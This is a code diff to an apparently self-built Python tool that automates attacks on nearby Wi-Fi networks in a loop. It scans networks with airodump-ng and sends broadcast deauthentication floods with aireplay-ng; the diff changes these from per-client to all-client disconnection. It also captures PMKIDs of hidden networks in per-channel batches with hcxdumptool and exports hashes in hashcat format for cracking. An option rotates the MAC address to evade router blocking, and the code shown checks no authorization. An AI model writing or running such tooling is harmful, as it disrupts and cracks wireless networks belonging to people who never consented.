@@ -318,12 +318,12 @@ def parse_airodump_csv(csv_path: Path) -> tuple[list[dict], list[dict]]:
                 continue
 
             if section == "ap" and headers_ap:
-                if first and len(row) >= len(headers_ap) and re.match(r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", first):
+                if first and len(row) >= 14 and re.match(r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", first):
                     ap = dict(zip(headers_ap, row[: len(headers_ap)]))
-                    bssid = ap.get("BSSID", "").strip()
+                    bssid = (ap.get("BSSID") or ap.get(" BSSID") or "").strip()
                     if bssid and bssid != "(not associated)":
                         try:
-                            ch = ap.get("channel", "").strip() or "0"
+                            ch = (ap.get("channel") or "").strip() or "0"
                             ap["channel"] = int(ch) if ch.isdigit() else 0
                         except (ValueError, TypeError):
                             ap["channel"] = 0
@@ -332,7 +332,11 @@ def parse_airodump_csv(csv_path: Path) -> tuple[list[dict], list[dict]]:
                             ap["rssi"] = int(pwr) if pwr.lstrip("-").isdigit() else -999
                         except (ValueError, TypeError):
                             ap["rssi"] = -999
-                        essid_val = (ap.get("ESSID") or "").strip()
+                        # airodump-ng CSV fixed order: ... (12)=ID-length, (13)=ESSID, (14)=Key
+                        # Use index 13 so ESSID is correct even when row length != header length
+                        essid_val = (row[13] if len(row) > 13 else "").strip()
+                        if not essid_val:
+                            essid_val = (ap.get("ESSID") or ap.get(" ESSID") or "").strip()
                         if not essid_val:
                             essid_val = "hidden_network"
                         ap["ESSID"] = essid_val
@@ -412,34 +416,36 @@ def get_networks_with_clients(
 
     csv_path = max(csv_files, key=lambda p: p.stat().st_mtime)
     aps, stations = parse_airodump_csv(csv_path)
+    # Use lowercase BSSID so AP section (e.g. B4:20:...) matches station section (e.g. b4:20:...)
     bssid_to_clients: dict[str, list[str]] = {}
     for st in stations:
-        b = (st.get("BSSID") or "").strip()
-        mac = (st.get("Station MAC") or "").strip()
+        b = (st.get("BSSID") or st.get(" BSSID") or "").strip().lower()
+        mac = (st.get("Station MAC") or st.get(" Station MAC") or "").strip()
         if b and mac:
             bssid_to_clients.setdefault(b, []).append(mac)
 
     result: list[dict] = []
     for ap in aps:
-        bssid = (ap.get("BSSID") or "").strip()
-        essid = (ap.get("ESSID") or "").strip()
-        if not bssid or bssid.lower() in skip_bssids:
+        bssid_raw = (ap.get("BSSID") or ap.get(" BSSID") or "").strip()
+        bssid_lower = bssid_raw.lower()
+        essid = (ap.get("ESSID") or ap.get(" ESSID") or "").strip()
+        if not bssid_raw or bssid_lower in skip_bssids:
             continue
         if essid in skip_essids:
             continue
-        clients = bssid_to_clients.get(bssid, [])
-        # Include APs with clients; also include hidden APs with no clients (for PMKID capture)
+        clients = bssid_to_clients.get(bssid_lower, [])
+        # Include only: APs with clients (handshake this cycle), or hidden with no clients (PMKID at end)
         if not clients and essid != "hidden_network":
             continue
         result.append({
-            "bssid": bssid,
+            "bssid": bssid_raw,
             "channel": ap.get("channel", 0) or 0,
             "essid": essid,
             "clients": list(dict.fromkeys(clients)),
             "rssi": ap.get("rssi", -999),
         })
 
-    # Prioritize hidden APs first, then by RSSI descending (stronger signal first)
+    # Prioritize hidden first, then by RSSI descending (stronger signal first)
     result.sort(key=lambda n: (0 if (n.get("essid") or "") == "hidden_network" else 1, -(n.get("rssi") or -999)))
     logging.info("Found %d networks with clients (after skipping %d done)", len(result), len(skip_bssids))
     return result
@@ -632,6 +638,110 @@ def try_capture_pmkid(
     return None
 
 
+def try_capture_pmkid_channel(
+    mon_iface: str,
+    channel: int,
+    bssid_list: list[str],
+    handshakes_dir: Path,
+    timeout_sec: int,
+    current_proc_holder: Optional[list] = None,
+) -> list[tuple[str, Path]]:
+    """
+    PMKID capture for multiple BSSIDs on the same channel in one run (faster than one-by-one).
+    Returns list of (bssid, path_to_22000) for each BSSID actually captured.
+    """
+    if not bssid_list or shutil.which("hcxdumptool") is None or shutil.which("hcxpcapngtool") is None:
+        return []
+    handshakes_dir.mkdir(parents=True, exist_ok=True)
+    bssid_flat_list = [b.replace(":", "").replace("-", "") for b in bssid_list]
+    filter_content = "\n".join(bssid_flat_list) + "\n"
+    tag = f"ch{channel}_{bssid_flat_list[0][:8]}"
+    filter_path = handshakes_dir / f"pmkid_filter_{tag}.txt"
+    pcapng_path = handshakes_dir / f"pmkid_{tag}.pcapng"
+    try:
+        filter_path.write_text(filter_content, encoding="utf-8")
+    except OSError:
+        return []
+    cmd = [
+        "hcxdumptool",
+        "-i", mon_iface,
+        "-o", str(pcapng_path),
+        "--filterlist_ap", str(filter_path),
+        "--filtermode=2",
+        "-c", str(channel),
+        "--enable_status=1",
+    ]
+    logging.info(
+        "PMKID capture (no client): channel %s, %d BSSID(s), %ds",
+        channel, len(bssid_list), timeout_sec,
+    )
+    proc = subprocess.Popen(
+        cmd,
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.PIPE,
+        cwd=str(handshakes_dir),
+    )
+    if current_proc_holder is not None:
+        current_proc_holder[0] = proc
+    try:
+        time.sleep(timeout_sec)
+    finally:
+        if current_proc_holder is not None:
+            current_proc_holder[0] = None
+        proc.terminate()
+        try:
+            proc.wait(timeout=8)
+        except subprocess.TimeoutExpired:
+            proc.kill()
+            proc.wait()
+    try:
+        filter_path.unlink(missing_ok=True)
+    except OSError:
+        pass
+    if not pcapng_path.exists() or pcapng_path.stat().st_size == 0:
+        if pcapng_path.exists():
+            try:
+                pcapng_path.unlink(missing_ok=True)
+            except OSError:
+                pass
+        return []
+    out_22000 = pcapng_path.with_suffix(".22000")
+    code, _, _ = run_cmd(["hcxpcapngtool", "-o", str(out_22000), str(pcapng_path)], timeout=60)
+    try:
+        pcapng_path.unlink(missing_ok=True)
+    except OSError:
+        pass
+    if code != 0 or not out_22000.exists() or out_22000.stat().st_size == 0:
+        if out_22000.exists():
+            try:
+                out_22000.unlink(missing_ok=True)
+            except OSError:
+                pass
+        return []
+    # Parse .22000: WPA*01*PMKID*MAC_AP*MAC_CLIENT*ESSID -> extract MAC_AP (normalize to lowercase)
+    bssid_lower_set: set[str] = set()
+    try:
+        with open(out_22000, encoding="utf-8", errors="replace") as f:
+            for line in f:
+                line = line.strip()
+                if not line or line.startswith("#"):
+                    continue
+                parts = line.split("*")
+                if len(parts) >= 4 and parts[0] == "WPA" and parts[1] == "01":
+                    mac_ap = parts[3].strip().lower().replace("-", ":")
+                    if len(mac_ap) >= 17 or len(mac_ap) == 12:  # xx:xx:xx:xx:xx:xx or xxxxxxxxxxxx
+                        if ":" not in mac_ap and len(mac_ap) == 12:
+                            mac_ap = ":".join(mac_ap[i : i + 2] for i in range(0, 12, 2))
+                        bssid_lower_set.add(mac_ap)
+    except OSError:
+        pass
+    result: list[tuple[str, Path]] = []
+    for bssid in bssid_list:
+        if bssid.lower() in bssid_lower_set:
+            result.append((bssid, out_22000))
+    return result
+
+
 def verify_handshake_cap(cap_path: Path) -> bool:
     """Verify that cap file contains at least one WPA handshake using aircrack-ng."""
     if not cap_path.exists():
@@ -715,15 +825,14 @@ def capture_handshake(
                     essid_display,
                 )
                 break
-            for client in client_macs[:3]:  # limit clients per deauth round
-                run_cmd([
-                    "aireplay-ng",
-                    "-0", "2",
-                    "-a", bssid,
-                    "-c", client,
-                    "--ignore-negative-one",
-                    mon_iface,
-                ], timeout=10)
+            # Broadcast deauth (no -c): kicks all clients on the AP, not just the ones we know
+            run_cmd([
+                "aireplay-ng",
+                "-0", "6",
+                "-a", bssid,
+                "--ignore-negative-one",
+                mon_iface,
+            ], timeout=10)
             time.sleep(4)
             if ap_timeout is not None and (time.time() - start_time) >= ap_timeout:
                 logging.info(
@@ -1147,10 +1256,10 @@ def check_dependencies() -> bool:
     """
     Validate required and optional external tools at startup.
     Required: aircrack-ng suite (airmon-ng, airodump-ng, aireplay-ng, aircrack-ng), iw.
-    Optional: hcxtools (hcxpcapngtool), hashcat, iwconfig (fallback for iw).
+    Optional: hcxtools (hcxpcapngtool, hcxdumptool for PMKID), hashcat, iwconfig (fallback for iw).
     """
     required = ["airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng", "iw"]
-    optional = ["hcxpcapngtool", "hashcat", "iwconfig"]
+    optional = ["hcxpcapngtool", "hcxdumptool", "hashcat", "iwconfig"]
 
     missing_required = [c for c in required if shutil.which(c) is None]
     missing_optional = [c for c in optional if shutil.which(c) is None]
@@ -1167,11 +1276,31 @@ def check_dependencies() -> bool:
             "Optional tools not found: %s (some features may be limited)",
             ", ".join(missing_optional),
         )
-        if "hcxpcapngtool" in missing_optional:
-            logging.warning("Install hcxtools for .22000 hashcat format: sudo apt install hcxtools")
+        if "hcxpcapngtool" in missing_optional or "hcxdumptool" in missing_optional:
+            logging.warning("Install hcxtools for .22000 and PMKID: sudo apt install hcxtools")
 
     logging.debug("Required dependencies OK.")
     return True
+
+
+def cleanup_handshakes_dir_leftovers(handshakes_dir: Path) -> None:
+    """
+    Remove junk files from previous runs (interrupted captures, PMKID temp files).
+    Same kind of cleanup as on exit; call at startup so we start with a clean handshakes dir.
+    """
+    if not handshakes_dir.exists():
+        return
+    removed = 0
+    for pattern in ("pmkid_filter_*.txt", "pmkid_*.pcapng", "hs_*"):
+        for p in handshakes_dir.glob(pattern):
+            try:
+                if p.is_file():
+                    p.unlink()
+                    removed += 1
+            except OSError:
+                pass
+    if removed:
+        logging.info("Cleaned %d leftover file(s) from previous run in %s", removed, handshakes_dir)
 
 
 def verify_stored_handshakes(conn: sqlite3.Connection, handshakes_dir: Path) -> None:
@@ -1250,7 +1379,7 @@ def main() -> int:
         formatter_class=_HelpFormatter,
     )
     parser.add_argument("-d", "--device", default=None, help="Wireless interface (e.g. wlan0); not required with -w")
-    parser.add_argument("-t", "--time", type=int, default=30, help="Scan duration in seconds")
+    parser.add_argument("-t", "--time", type=int, default=60, help="Scan duration in seconds")
     parser.add_argument("-l", "--log", default=None, help="Path to log file")
     parser.add_argument("-p", "--path", default=None, help="Directory for scan files, handshakes and DB")
     parser.add_argument("-se", "--skip-essid", action="append", default=[], dest="skip_essids", metavar="ESSID",
@@ -1281,6 +1410,8 @@ def main() -> int:
                         help="Max time (seconds) to spend trying to reveal a hidden ESSID before capture.")
     parser.add_argument("--hidden-passive", type=int, default=10, metavar="SECONDS",
                         help="Passive sniff time (no deauth) before attempting deauth for hidden ESSID.")
+    parser.add_argument("--pmkid-timeout", type=int, default=15, metavar="SECONDS",
+                        help="Time per channel for PMKID capture (hidden, no client). Multiple BSSIDs on same channel are captured together (default: 15).")
     parser.add_argument("--mac-rotate", type=int, default=0, metavar="N",
                         help="Rotate interface MAC every N cycles (0=disabled). Reduces router blocking.")
     args = parser.parse_args()
@@ -1373,6 +1504,8 @@ def main() -> int:
         return 1
 
     scan_temp_dir = Path(tempfile.mkdtemp(prefix="wifi_handshake_scan_"))
+
+    cleanup_handshakes_dir_leftovers(handshakes_dir)
 
     # Save NetworkManager state so we can restore only if it was active
     nm_was_active = False
@@ -1467,21 +1600,21 @@ def main() -> int:
     start_time = time.time()
     stats = {
         "cycles": 0,
-        "candidate_networks": 0,
         "attempted": 0,
         "success": 0,
         "failed": 0,
         "skipped": 0,
-        "hidden_detected": 0,
         "hidden_resolved": 0,
     }
+    seen_bssids: set[str] = set()
+    seen_hidden_bssids: set[str] = set()
 
     def format_stats() -> str:
         elapsed = int(time.time() - start_time)
         return (
-            f"Cycles: {stats['cycles']} | Candidate networks: {stats['candidate_networks']} | "
+            f"Cycles: {stats['cycles']} | Networks: {len(seen_bssids)} | "
             f"Attempts: {stats['attempted']} | Success: {stats['success']} | Failed: {stats['failed']} | "
-            f"Skipped: {stats['skipped']} | Hidden: {stats['hidden_detected']} detected, {stats['hidden_resolved']} resolved | "
+            f"Skipped: {stats['skipped']} | Hidden: {len(seen_hidden_bssids)}, Resolved: {stats['hidden_resolved']} | "
             f"Total time: {elapsed}s"
         )
 
@@ -1507,12 +1640,14 @@ def main() -> int:
             networks = get_networks_with_clients(
                 mon_iface, args.time, scan_temp_dir, skip_bssids, skip_essids, current_proc_holder, args.channel
             )
-            stats["candidate_networks"] += len(networks)
+            for net in networks:
+                seen_bssids.add(net["bssid"].lower())
             if not networks:
                 logging.info("No new networks with clients; rescanning in 60s")
                 time.sleep(60)
                 continue
 
+            # Handshake capture (with deauth) for networks with clients; hidden+no-clients skipped here, done at end
             for net in networks:
                 bssid = net["bssid"]
                 channel = net["channel"]
@@ -1538,29 +1673,9 @@ def main() -> int:
                     continue
 
                 if essid == "hidden_network":
-                    stats["hidden_detected"] += 1
+                    seen_hidden_bssids.add(bssid.lower())
                     if not clients:
-                        # No clients: try PMKID capture (no deauth, no client needed)
-                        pmkid_path = try_capture_pmkid(
-                            mon_iface, bssid, channel, handshakes_dir,
-                            timeout_sec=min(45, getattr(args, "hidden_wait", 25)),
-                            current_proc_holder=current_proc_holder,
-                        )
-                        if pmkid_path is not None:
-                            conn.execute(
-                                "INSERT OR REPLACE INTO captured (bssid, essid, handshake_path, created_at) VALUES (?,?,?,?)",
-                                (bssid, "PMKID", str(pmkid_path), time.strftime("%Y-%m-%d %H:%M:%S")),
-                            )
-                            conn.commit()
-                            reload_skip_list()
-                            stats["success"] += 1
-                            stats["attempted"] += 1
-                            logging.info("PMKID captured for %s (no client): %s", bssid, pmkid_path)
-                        else:
-                            stats["skipped"] += 1
-                            logging.debug("No clients for hidden %s; PMKID capture failed or skipped", bssid)
-                        if args.ap_delay and args.ap_delay > 0:
-                            time.sleep(args.ap_delay)
+                        # Already handled in phase 1 (PMKID at start of cycle); skip here
                         continue
                     logging.info("Hidden network detected: BSSID %s. Attempting ESSID recovery...", bssid)
                     cached = discovered_essids.get(bssid.lower())
@@ -1677,6 +1792,59 @@ def main() -> int:
                 if args.ap_delay and args.ap_delay > 0:
                     logging.debug("Waiting %ds before moving to next AP to avoid driver issues.", args.ap_delay)
                     time.sleep(args.ap_delay)
+
+            # PMKID capture for hidden networks with no clients: only every 5 cycles
+            pmkid_nets: list[dict] = []
+            for net in networks:
+                bssid = net["bssid"]
+                channel = net["channel"]
+                essid = net["essid"]
+                clients = net["clients"]
+                if essid != "hidden_network" or clients:
+                    continue
+                if not channel:
+                    continue
+                if bssid.lower() in skip_bssids:
+                    continue
+                if fail_count.get(bssid.lower(), 0) >= MAX_FAILURES_BEFORE_SKIP:
+                    continue
+                if target_bssids and bssid.lower() not in target_bssids:
+                    continue
+                if target_essids and essid not in target_essids:
+                    continue
+                pmkid_nets.append(net)
+            pmkid_interval = 5
+            if cycle % pmkid_interval == 0:
+                logging.info("PMKID capture (every %d cycles): running this cycle (cycle %d)", pmkid_interval, cycle)
+                channel_to_bssids: dict[int, list[str]] = {}
+                for net in pmkid_nets:
+                    ch = net["channel"]
+                    channel_to_bssids.setdefault(ch, []).append(net["bssid"])
+                pmkid_timeout = getattr(args, "pmkid_timeout", 15)
+                for channel, bssids in channel_to_bssids.items():
+                    captured_pairs = try_capture_pmkid_channel(
+                        mon_iface, channel, bssids, handshakes_dir,
+                        timeout_sec=pmkid_timeout,
+                        current_proc_holder=current_proc_holder,
+                    )
+                    for bssid, pmkid_path in captured_pairs:
+                        conn.execute(
+                            "INSERT OR REPLACE INTO captured (bssid, essid, handshake_path, created_at) VALUES (?,?,?,?)",
+                            (bssid, "PMKID", str(pmkid_path), time.strftime("%Y-%m-%d %H:%M:%S")),
+                        )
+                        conn.commit()
+                        reload_skip_list()
+                        stats["success"] += 1
+                        stats["attempted"] += 1
+                        logging.info("PMKID captured for %s (no client): %s", bssid, pmkid_path)
+                    stats["skipped"] += len(bssids) - len(captured_pairs)
+                    if not captured_pairs:
+                        logging.debug("No PMKID for %d BSSID(s) on channel %s this cycle", len(bssids), channel)
+                    if args.ap_delay and args.ap_delay > 0 and len(channel_to_bssids) > 1:
+                        time.sleep(args.ap_delay)
+            elif pmkid_nets:
+                next_run = ((cycle // pmkid_interval) + 1) * pmkid_interval
+                logging.info("PMKID capture (every %d cycles): skipping this cycle; next on cycle %d", pmkid_interval, next_run)
 
             logging.info("Cycle %d done; starting new scan.", cycle)
 
